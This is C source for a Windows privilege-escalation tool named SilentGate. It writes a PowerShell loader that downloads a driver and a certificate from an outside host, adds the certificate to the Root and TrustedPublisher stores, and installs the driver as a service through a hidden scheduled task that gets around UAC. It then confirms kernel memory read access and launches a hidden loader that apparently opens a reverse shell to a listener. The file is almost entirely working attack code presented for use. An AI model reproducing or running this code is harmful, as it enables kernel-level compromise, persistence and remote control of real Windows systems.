/*
 * SilentGate v9.0 - UAC Bypass via Task Scheduler
 * Author: JarDani
 * UAC-filtered admin -> Task Scheduler SYSTEM -> Kernel driver
 * Uses Register-ScheduledTask which does not trigger UAC prompt
 * Proven technique from v5.0
 */
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;

BOOL vm_read(HANDLE h, ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

DWORD get_pid(const char* name) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD pid=0;
    if(Process32First(snap,&pe)){
        do{if(_stricmp(pe.szExeFile,name)==0){pid=pe.th32ProcessID;break;}
        }while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);
    return pid;
}

int main() {
    printf("[V9] SilentGate v9.0 - Task Scheduler Chain\n");
    printf("[V9] Author: JarDani\n\n");

    /* Step 1: Write PowerShell loader script */
    char ps_path[MAX_PATH];
    strcpy(ps_path, "C:\\ProgramData\\sg_load.ps1");

    FILE* f=fopen(ps_path,"w");
    fprintf(f,"# SilentGate v9.0 - SYSTEM driver loader\n");
    fprintf(f,"$drv='http://192.168.217.146:8080/output/v9/sg_driver_signed.sys'\n");
    fprintf(f,"$crt='http://192.168.217.146:8080/output/v9/sg_test.crt'\n");
    fprintf(f,"$dp='C:\\Windows\\System32\\drivers\\sgdrv.sys'\n");
    fprintf(f,"$cp='C:\\Windows\\Temp\\sg.crt'\n");
    fprintf(f,"(New-Object Net.WebClient).DownloadFile($crt,$cp)\n");
    fprintf(f,"certutil -addstore TrustedPublisher $cp | Out-Null\n");
    fprintf(f,"certutil -addstore Root $cp | Out-Null\n");
    fprintf(f,"(New-Object Net.WebClient).DownloadFile($drv,$dp)\n");
    fprintf(f,"$s=New-Service -Name SilentGate -BinaryPathName $dp -StartupType Manual\n");
    fprintf(f,"Start-Service SilentGate\n");
    fprintf(f,"'OK' | Out-File 'C:\\ProgramData\\sg_ok.txt'\n");
    fclose(f);

    printf("[V9] Script: %s\n", ps_path);
    DeleteFileA("C:\\ProgramData\\sg_ok.txt");

    /* Step 2: Register task via PowerShell - no UAC needed */
    char ps_cmd[2048];
    snprintf(ps_cmd, sizeof(ps_cmd),
        "powershell -w hidden -ep bypass -c \""
        "$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
        "-Argument '-ep bypass -w hidden -f \\\"%s\\\"';"
        "$t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(3);"
        "$s=New-ScheduledTaskSettingsSet -Hidden;"
        "Register-ScheduledTask -TaskName SilentGateLoad "
        "-Action $a -Trigger $t -Settings $s -RunLevel Highest -Force\"",
        ps_path);

    printf("[V9] Registering task...\n");
    system(ps_cmd);

    printf("[V9] Waiting for SYSTEM task to load driver");
    for(int i=0;i<20;i++){
        Sleep(1000); printf("."); fflush(stdout);
        if(GetFileAttributesA("C:\\ProgramData\\sg_ok.txt")
            !=INVALID_FILE_ATTRIBUTES){
            printf("\n[V9] Driver loaded by SYSTEM task\n\n");
            break;
        }
    }
    printf("\n");

    /* Cleanup task */
    system("powershell -c \"Unregister-ScheduledTask -TaskName SilentGateLoad -Confirm:$false\" 2>nul");

    /* Step 3: Open device */
    printf("[V9] Opening kernel device...\n");
    HANDLE g_h=CreateFileA("\\\\.\\SilentGate",
        GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    if(g_h==INVALID_HANDLE_VALUE){
        printf("[V9] Device open failed: %lu\n",GetLastError());
        getchar(); return 1;
    }

    printf("[V9] Device opened - kernel access without UAC\n\n");

    /* Step 4: Verify kernel R/W */
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 ntos=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {ntos=(DWORD64)d[i];break;}
    } free(d);

    BYTE buf[4]={0};
    if(vm_read(g_h,ntos,buf,4)&&buf[0]==0x4D&&buf[1]==0x5A){
        printf("[V9] ntoskrnl MZ confirmed\n");
        printf("[V9] KERNEL R/W WORKING - NO UAC\n\n");
    }

    /* Step 5: Launch shell */
    printf("[V9] Launching shell...\n");
    char shell[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(shell,MAX_PATH,"%s\\sg_loader.exe",dir);

    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    CreateProcessA(shell,NULL,NULL,NULL,FALSE,
        CREATE_NO_WINDOW,NULL,NULL,&si,&pi);

    printf("[V9] Shell launched - check Kali nc\n");

    CloseHandle(g_h);
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
